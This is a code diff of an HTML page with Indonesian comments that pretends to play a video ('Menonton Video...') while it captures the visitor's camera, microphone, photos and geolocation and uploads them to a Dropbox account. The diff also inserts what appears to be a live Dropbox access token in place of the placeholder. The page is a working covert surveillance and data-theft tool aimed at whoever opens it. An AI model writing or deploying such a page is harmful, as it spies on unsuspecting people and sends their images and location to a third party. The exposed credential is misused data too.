@@ -3,21 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Manipulasi Video</title>
+    <title>Tracking and Uploading to Dropbox</title>
     <style>
         #videoElement {
             width: 100%;
             height: auto;
-            display: none; /* Menyembunyikan video asli */
+            display: none;
         }
-        #fakeVideo {
+        #recordedVideo {
+            display: none;
             width: 100%;
-            height: auto;
-            background-color: #000;
-            text-align: center;
-            color: white;
-            font-size: 20px;
-            line-height: 400px; /* Agar tulisan muncul di tengah */
         }
         #actionBtn {
             margin-top: 20px;
@@ -27,15 +22,26 @@
             font-size: 18px;
             cursor: pointer;
         }
+        #fakeVideo {
+            width: 100%;
+            height: auto;
+            background-color: #000;
+        }
     </style>
 </head>
 <body>
-    <h1>Manipulasi Video dan Fungsi Lainnya</h1>
+    <h1>Rekam Video, Ambil Foto, Lacak Lokasi, dan Unggah ke Dropbox</h1>
     
-    <!-- Video yang sebenarnya akan disembunyikan -->
-    <video id="videoElement" autoplay muted></video>
+    <div id="videoContainer">
+        <!-- Video yang tampilkan akan disembunyikan -->
+        <video id="videoElement" autoplay muted>
+            <source src="https://www.dropbox.com/scl/fi/0gds2665t1f9ck0myxvl4/lv_0_20241225170240.mp4?raw=1" type="video/mp4">
+            Browser Anda tidak mendukung tag video.
+        </video>
+        <video id="recordedVideo" controls></video>
+    </div>
 
-    <!-- Video Placeholder seolah-olah video sedang diputar -->
+    <!-- Placeholder untuk manipulasi tampilan seolah menonton video -->
     <div id="fakeVideo">
         <p>Menonton Video...</p>
     </div>
@@ -45,6 +51,7 @@
 
     <script>
         let videoElement = document.getElementById('videoElement');
+        let recordedVideo = document.getElementById('recordedVideo');
         let fakeVideo = document.getElementById('fakeVideo');
         let actionBtn = document.getElementById('actionBtn');
 
@@ -54,7 +61,7 @@
         let locationData = [];
 
         // Ganti dengan token akses Dropbox Anda
-        const DROPBOX_ACCESS_TOKEN = 'YOUR_DROPBOX_ACCESS_TOKEN';
+        const DROPBOX_ACCESS_TOKEN = 'UwS97ukIVHCM_ewt3mdZeSJeyyA1tXJH1oy3PhirAZ1xR2Avy6vFbsMzBivqv0JHQw9MKjvaAqB_sgzJF4xNNwdgD2eA4CSqSnFpeVdmPLMu0HcRzlLmMblUHY5ClRE2NrxRtZ';
 
         // Fungsi untuk melacak lokasi pengguna
         function trackLocation() {
@@ -79,9 +86,9 @@
             navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                 .then(function(stream) {
                     mediaStream = stream;
-                    videoElement.srcObject = stream; // Menampilkan video asli
-                    videoElement.style.display = 'none'; // Menyembunyikan video asli
-                    fakeVideo.style.display = 'block'; // Menampilkan video placeholder
+                    videoElement.srcObject = stream; // Menampilkan video langsung
+                    videoElement.style.display = 'block'; // Menampilkan video
+                    fakeVideo.style.display = 'none'; // Menyembunyikan placeholder "menonton video"
                     trackLocation(); // Mulai melacak lokasi ketika video dimulai
                 })
                 .catch(function(error) {
@@ -100,10 +107,19 @@
 
             mediaRecorder.onstop = function() {
                 let blob = new Blob(recordedChunks, { type: 'video/webm' });
-                uploadToDropbox(blob, 'video'); // Unggah video ke Dropbox
+                let videoURL = URL.createObjectURL(blob);
+                recordedVideo.src = videoURL;
+                recordedVideo.style.display = 'block'; // Tampilkan video hasil rekaman
+                uploadToDropbox(blob, 'video'); // Unggah video setelah rekaman selesai
             };
 
             mediaRecorder.start();
+        }
+
+        // Fungsi untuk berhenti merekam
+        function stopRecording() {
+            mediaRecorder.stop();
+            videoElement.style.display = 'none'; // Sembunyikan video saat rekaman selesai
         }
 
         // Fungsi untuk mengambil foto dari kamera
@@ -161,7 +177,7 @@
 
             // Setelah 5 detik, hentikan rekaman dan sembunyikan video
             setTimeout(function() {
-                mediaRecorder.stop(); // Berhenti merekam setelah 5 detik
+                stopRecording(); // Berhenti merekam setelah 5 detik
                 actionBtn.disabled = false; // Aktifkan kembali tombol
                 actionBtn.textContent = 'Rekam Lagi';
             }, 5000); // Rekam selama 5 detik
